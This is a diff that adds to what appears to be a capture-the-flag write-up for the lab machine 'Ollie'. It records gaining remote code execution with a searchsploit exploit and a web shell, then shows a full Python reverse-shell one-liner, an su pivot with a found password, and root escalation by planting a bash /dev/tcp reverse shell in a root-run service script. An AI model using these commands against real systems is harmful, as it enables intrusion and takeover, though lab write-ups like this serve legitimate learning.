@@ -107,3 +107,75 @@ After a lengthy discussion, we've come to the conclusion that you are the right 
 PS: Good luck and next time bring some treats!
 
 ```
+
+I found an exploit using searchsploit on my kali vm to get RCE if I have credentials to login. I ran the exploit script and
+got a shell. I ran `http://ollie.thm/evil.php?cmd=python3%20--version` which gave the output `1 Python 3.8.10  3 4`
+
+I ran...
+```python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.46.127",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```
+and got a reverse shell. I'm in!
+
+Foothold
+
+I got logged in as user `www-data`. I was able to pivot and `su` into user `ollie` using the password we found `OllieUnixMontgomery!`
+```
+cat user.txt
+THM{Ollie_boi_is_daH_Cut3st}
+
+ollie@hackerdog:~/.local/share$ sudo -l
+sudo -l
+[sudo] password for ollie: OllieUnixMontgomery!
+
+Sorry, user ollie may not run sudo on hackerdog.
+
+uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
+
+```
+
+
+/usr/bin/feedme
+```
+cat /etc/systemd/system/feedme.service
+# feedollie.service
+# test
+[Unit] 
+Description= Feed Ollie
+Documentation= Ollie is hungry!
+
+[Service] 
+Type= simple 
+User= root
+
+ExecStart= /usr/bin/feedme
+
+[Install] 
+WantedBy= multi-user.target
+ollie@hackerdog:/var/log$ cd /usr/bin
+cd /usr/bin
+ollie@hackerdog:/usr/bin$ ltrace feedme
+ltrace feedme
+"feedme" is not an ELF file
+ollie@hackerdog:/usr/bin$ cat feedme
+cat feedme
+#!/bin/bash
+
+# This is weird?
+ollie@hackerdog:/usr/bin$ ls -la | grep feedme 
+ls -la | grep feedme
+-rwxrw-r--  1 root   ollie          30 Feb 12  2022 feedme
+
+```
+
+I left a reverse shell in the script and waited to see if it ran
+```
+bash -i >& /dev/tcp/10.13.46.127/1112 0>&1
+```
+
+ROOT SHELL!!!
+```
+root@hackerdog:/# cat /root/root.txt
+cat /root/root.txt
+THM{Ollie_Luvs_Chicken_Fries}
+root@hackerdog:/# 
+
+```
